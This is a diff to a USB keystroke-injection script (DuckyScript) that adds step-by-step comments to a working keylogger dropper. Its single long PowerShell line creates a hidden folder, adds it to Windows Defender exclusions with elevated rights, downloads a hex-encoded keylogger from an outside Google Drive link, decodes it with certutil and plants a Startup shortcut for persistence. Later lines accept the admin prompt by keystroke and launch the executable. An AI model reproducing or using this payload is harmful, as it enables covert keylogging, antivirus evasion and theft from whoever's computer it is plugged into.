@@ -1,22 +1,32 @@
 
-REM Requirements:
-REM     - Nothing
-
+REM Open Run 
 GUI r
+REM DELAY for slower pcs/internet
 DELAY 1000
+REM Open Powershell
 STRING powershell
 DELAY 1000
 ENTER
 DELAY 2000
+REM One line to handle delays 
+REM Makes Directory for log and .exe file
+REM Adds Directory to list of excluded folders from Defender
+REM Downloads python keylogger script from Google Drive
+REM Decodes hex to make exec file
+REM Creates and stores shortcut in start up apps folder
+REM Copies path to clipboard
 STRING mkdir "$env:windir\Temp\Cache";Start-Process powershell -Verb RunAs -ArgumentList "Add-MpPreference -ExclusionPath 'C:\Windows\temp\Cache'";(new-object System.Net.WebClient).DownloadFile("https://drive.usercontent.google.com/u/0/uc?id=15dfqg3KZ7pQ_mlg1ttTo8Nh25q1AFKSd&export=download", "$env:windir\Temp\Cache\key.hex");certutil -f -decodeHex "$env:windir\temp\Cache\key.hex" "$env:windir\Temp\Cache\key.exe";$s=(New-Object -COM WScript.Shell).CreateShortcut("$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Shelzy.lnk");$s.TargetPath="$env:windir\temp\Cache\key.exe";$s.Save();"$env:windir\Temp\Cache\key.exe" | clip
 ENTER
 DELAY 2000
+REM Admin prompt skipped with left arrow + enter
 Left
 DELAY 1000
 ENTER
 DELAY 20000
+REM Opens Run
 GUI r
 DELAY 1000
+REM Prints path to exec
 CTRL v
 ENTER
 
